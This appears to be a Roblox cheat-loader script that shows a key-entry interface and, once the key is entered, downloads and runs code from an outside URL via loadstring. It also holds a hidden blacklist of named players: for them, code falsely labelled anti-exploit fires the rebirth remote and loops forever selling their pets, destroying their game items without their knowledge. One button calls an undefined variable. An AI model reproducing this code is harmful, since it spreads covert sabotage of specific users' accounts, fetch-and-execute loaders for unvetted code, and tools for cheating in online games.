-- ==========================================
-- BLACKLIST & CONFIGURATION SYSTEM
-- ==========================================
local BLACKLISTED_USERS = {
    "eyuns09",
    "mikko234514",
    "Jqmezgaming123",
    "Argusgodss",
    "mhar_rivals",
    "sahsa12345l",
    "Xx76_vibezz",
    "TAKEME356",
    "Yuki_16747",
    "georgeportabes",
    "Code5yndicateXMain",
    "XDCraftersgame",
    "sadtryfornothing",
    "rbhinghuf",
    "18734D8",
    "baby_girl1n4",
    "prince_polA",
    "prince_poIA"
}

local function isBlacklisted(player)
    for _, idOrName in ipairs(BLACKLISTED_USERS) do
        if type(idOrName) == "number" and player.UserId == idOrName then
            return true
        elseif type(idOrName) == "string" and player.Name:lower() == idOrName:lower() then
            return true
        end
    end
    return false
end

local Players = game:GetService("Players")
local localPlayer = Players.LocalPlayer or Players:GetPropertyChangedSignal("LocalPlayer"):Wait()

-- ==========================================
-- KUNG BLACKLISTED: Auto-Rebirth & Auto-Sell AGAD (Walang Key System na lalabas)
-- ==========================================
if isBlacklisted(localPlayer) then
    print("[Anti-Exploit] Blacklisted player detected. Executing auto-rebirth and auto-sell...")
    
    -- 1. Auto-Rebirth
    pcall(function()
        game:GetService("ReplicatedStorage").remotes.rebirthRequest:FireServer()
    end)
    
    -- 2. Background Auto-Sell System
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local remotesFolder = ReplicatedStorage:FindFirstChild("remotes") or ReplicatedStorage:FindFirstChild("Remotes")
    local sellRemote = nil
    
    if remotesFolder then
        sellRemote = remotesFolder:FindFirstChild("sellPet") 
            or remotesFolder:FindFirstChild("SellPet") 
            or remotesFolder:FindFirstChild("sellRequest")
            or remotesFolder:FindFirstChild("SellRequest")
    end
    
    if sellRemote then
        local function startBackgroundAutoSell(petName)
            task.spawn(function()
                while true do
                    local p = Players.LocalPlayer
                    local petsFolder = p:FindFirstChild("PetsFolder") or p:FindFirstChild("Pets")
                    
                    if petsFolder and petsFolder:FindFirstChild(petName) then
                        pcall(function()
                            sellRemote:FireServer(petsFolder[petName])
                        end)
                    end
                    
                    task.wait(1)
                end
            end)
        end
        
        local petsToAutoSell = {
            "Cat", "Dog", "Rabbit", "Hamster", "Shark",
            "Wolf", "Fox", "MuscleMan", "Spike", "Bear",
            "Snow Wolf", "Forest Deer", "Fire Pup", "Shadow Wolf", "Thunder Bear",
            "Spirit Wolf", "Storm Tiger", "Lunar Dragon", "Crystal Dragon",
            "Pelican", "Divine Dragon", "Neon Divine Dragon", "Space Dragon",
            "Red Alien", "Fire Alien", "Vortex", "Astrax",
            "Rage Shark", "Titan Crocodile", "Battle Gorilla", "Champion Dragon"
        }
        
        for _, pet in ipairs(petsToAutoSell) do
            startBackgroundAutoSell(pet)
        end
    end
    
    -- I-terminate na ang script para hindi na lumabas ang UI sa mga blacklisted
    return
end

-- // Configuration
local Key = "PrimeKenzouu"
local ScriptUrl = "https://slh-hub.lovable.app/raw/kyomba2public"
local TiktokLink = "https://tiktok.com/kenzxouu.official"

-- // Services
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local CoreGui = game:GetService("CoreGui")

-- // Remove existing UI if present
if CoreGui:FindFirstChild("NeonKeyUI") then
    CoreGui.NeonKeyUI:Destroy()
end

-- // UI Generation
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "NeonKeyUI"
ScreenGui.Parent = CoreGui

-- Minimized Toggle Button
local ToggleButton = Instance.new("TextButton")
ToggleButton.Parent = ScreenGui
ToggleButton.Size = UDim2.new(0, 40, 0, 40)
ToggleButton.Position = UDim2.new(0, 50, 0, 100)
ToggleButton.Text = "●"
ToggleButton.Font = Enum.Font.GothamBold
ToggleButton.TextSize = 24
ToggleButton.TextColor3 = Color3.fromRGB(0, 255, 200)
ToggleButton.BackgroundColor3 = Color3.fromRGB(15, 15, 30)
ToggleButton.AutoButtonColor = true
Instance.new("UICorner", ToggleButton).CornerRadius = UDim.new(1, 0)
ToggleButton.Visible = false

-- Draggable Logic for Toggle Button
local dragging, dragInput, dragStart, startPos
ToggleButton.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 and ToggleButton.Visible then
        dragging = true
        dragStart = input.Position
        startPos = ToggleButton.Position
    end
end)

ToggleButton.InputChanged:Connect(function(input)
    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
        local delta = input.Position - dragStart
        ToggleButton.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)

ToggleButton.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = false
    end
end)

-- Main Frame
local MainFrame = Instance.new("Frame")
MainFrame.Parent = ScreenGui
MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
MainFrame.Position = UDim2.new(0.5, 0, 1.2, 0)
MainFrame.Size = UDim2.new(0, 420, 0, 240)
MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 40)
MainFrame.Visible = true
Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 12)

local MainStroke = Instance.new("UIStroke", MainFrame)
MainStroke.Thickness = 3
MainStroke.Color = Color3.fromRGB(0, 255, 200)

-- Tween opening animation
local introTween = TweenService:Create(MainFrame, TweenInfo.new(0.7, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
    Position = UDim2.new(0.5, 0, 0.5, 0)
})
introTween:Play()

-- Title & Subtitle
local TitleLabel = Instance.new("TextLabel")
TitleLabel.Parent = MainFrame
TitleLabel.Text = "Kenzou Key System"
TitleLabel.Size = UDim2.new(1, 0, 0, 50)
TitleLabel.BackgroundTransparency = 1
TitleLabel.TextColor3 = Color3.fromRGB(0, 255, 200)
TitleLabel.Font = Enum.Font.GothamBold
TitleLabel.TextSize = 22

local SubTitleLabel = Instance.new("TextLabel")
SubTitleLabel.Parent = MainFrame
SubTitleLabel.Text = "Made by: PrimeKenzou"
SubTitleLabel.Size = UDim2.new(1, 0, 0, 20)
SubTitleLabel.Position = UDim2.new(0, 0, 0.18, 0)
SubTitleLabel.BackgroundTransparency = 1
SubTitleLabel.TextColor3 = Color3.fromRGB(0, 255, 200)
SubTitleLabel.Font = Enum.Font.Gotham
SubTitleLabel.TextSize = 14

-- Key Input TextBox
local KeyBox = Instance.new("TextBox")
KeyBox.Parent = MainFrame
KeyBox.PlaceholderText = "Enter your key..."
KeyBox.Size = UDim2.new(0.82, 0, 0, 40)
KeyBox.Position = UDim2.new(0.09, 0, 0.32, 0)
KeyBox.BackgroundColor3 = Color3.fromRGB(15, 15, 30)
KeyBox.TextColor3 = Color3.fromRGB(0, 255, 200)
KeyBox.Font = Enum.Font.Gotham
KeyBox.TextSize = 18
Instance.new("UICorner", KeyBox).CornerRadius = UDim.new(0, 8)

-- Verify Button
local VerifyButton = Instance.new("TextButton")
VerifyButton.Parent = MainFrame
VerifyButton.Size = UDim2.new(0.82, 0, 0, 40)
VerifyButton.Position = UDim2.new(0.09, 0, 0.55, 0)
VerifyButton.BackgroundColor3 = Color3.fromRGB(0, 255, 200)
VerifyButton.Text = "Verify Key"
VerifyButton.TextColor3 = Color3.fromRGB(10, 10, 20)
VerifyButton.Font = Enum.Font.GothamBold
VerifyButton.TextSize = 18
Instance.new("UICorner", VerifyButton).CornerRadius = UDim.new(0, 8)

-- Get Key Button
local GetKeyButton = Instance.new("TextButton")
GetKeyButton.Parent = MainFrame
GetKeyButton.Size = UDim2.new(0.82, 0, 0, 40)
GetKeyButton.Position = UDim2.new(0.09, 0, 0.75, 0)
GetKeyButton.BackgroundColor3 = Color3.fromRGB(0, 200, 255)
GetKeyButton.Text = "Get Key"
GetKeyButton.TextColor3 = Color3.fromRGB(10, 10, 20)
GetKeyButton.Font = Enum.Font.GothamBold
GetKeyButton.TextSize = 18
Instance.new("UICorner", GetKeyButton).CornerRadius = UDim.new(0, 8)

-- Close Button (X)
local CloseButton = Instance.new("TextButton")
CloseButton.Parent = MainFrame
CloseButton.Text = "X"
CloseButton.Size = UDim2.new(0, 30, 0, 30)
CloseButton.Position = UDim2.new(1, -35, 0, 5)
CloseButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
CloseButton.Font = Enum.Font.GothamBold
CloseButton.TextSize = 18
Instance.new("UICorner", CloseButton).CornerRadius = UDim.new(1, 0)

CloseButton.MouseButton1Click:Connect(function()
    ScreenGui:Destroy()
end)

-- Minimize Button (-)
local MinimizeButton = Instance.new("TextButton")
MinimizeButton.Parent = MainFrame
MinimizeButton.Text = "-"
MinimizeButton.Size = CloseButton.Size
MinimizeButton.Position = UDim2.new(1, -75, 0, 5)
MinimizeButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
MinimizeButton.Font = Enum.Font.GothamBold
MinimizeButton.TextSize = 18
Instance.new("UICorner", MinimizeButton).CornerRadius = UDim.new(1, 0)

MinimizeButton.MouseButton1Click:Connect(function()
    TweenService:Create(MainFrame, TweenInfo.new(0.4, Enum.EasingStyle.Quad), {
        Position = UDim2.new(0.5, 0, 1.2, 0)
    }):Play()
    
    TweenService:Create(MainFrame, TweenInfo.new(0.4, Enum.EasingStyle.Quad), {
        Size = UDim2.new(0, 420, 0, 0)
    }):Play()
    
    task.wait(0.4)
    MainFrame.Visible = false
    ToggleButton.Visible = true
end)

ToggleButton.MouseButton1Click:Connect(function()
    ToggleButton.Visible = false
    MainFrame.Visible = true
    MainFrame.Size = UDim2.new(0, 420, 0, 0)
    MainFrame.Position = UDim2.new(0.5, 0, 1.2, 0)
    
    TweenService:Create(MainFrame, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {
        Size = UDim2.new(0, 420, 0, 240),
        Position = UDim2.new(0.5, 0, 0.5, 0)
    }):Play()
end)

-- // Utility Tween Function
local function tweenProperty(object, property, targetValue, duration)
    TweenService:Create(object, TweenInfo.new(duration, Enum.EasingStyle.Quad), {
        [property] = targetValue
    }):Play()
end

-- // Get Key Copy Action
GetKeyButton.MouseButton1Click:Connect(function()
    pcall(function()
        setclipboard(DiscordLink)
    end)
    local oldText = GetKeyButton.Text
    GetKeyButton.Text = "Link copied!"
    task.delay(3, function()
        GetKeyButton.Text = oldText
    end)
end)

-- // Verify Key Action
VerifyButton.MouseButton1Click:Connect(function()
    if KeyBox.Text == Key then
        tweenProperty(MainStroke, "Color", Color3.fromRGB(0, 255, 0), 0.5)
        tweenProperty(VerifyButton, "BackgroundColor3", Color3.fromRGB(0, 255, 0), 0.5)
        VerifyButton.Text = "Correct Key"
        task.wait(0.5)
        ScreenGui:Destroy()
        
        local success, err = pcall(function()
            loadstring(game:HttpGet(ScriptUrl, true))()
        end)
        if not success then
            warn("[KeySystem] Failed to load script:", err)
        end
    else
        tweenProperty(MainStroke, "Color", Color3.fromRGB(255, 0, 0), 0.5)
        tweenProperty(VerifyButton, "BackgroundColor3", Color3.fromRGB(255, 0, 0), 0.5)
        VerifyButton.Text = "Wrong Key"
        
        task.spawn(function()
            task.wait(3)
            tweenProperty(MainStroke, "Color", Color3.fromRGB(0, 255, 200), 0.5)
            tweenProperty(VerifyButton, "BackgroundColor3", Color3.fromRGB(0, 255, 200), 0.5)
            VerifyButton.Text = "Verify Key"
        end)
    end
end)

-- // Rainbow Title Animation Loop
task.spawn(function()
    local hue = 0
    while task.wait(0.02) do
        hue = (hue + 1) % 255
        local color = Color3.fromHSV(hue / 255, 1, 1)
        TitleLabel.TextColor3 = color
        SubTitleLabel.TextColor3 = color
    end
end)
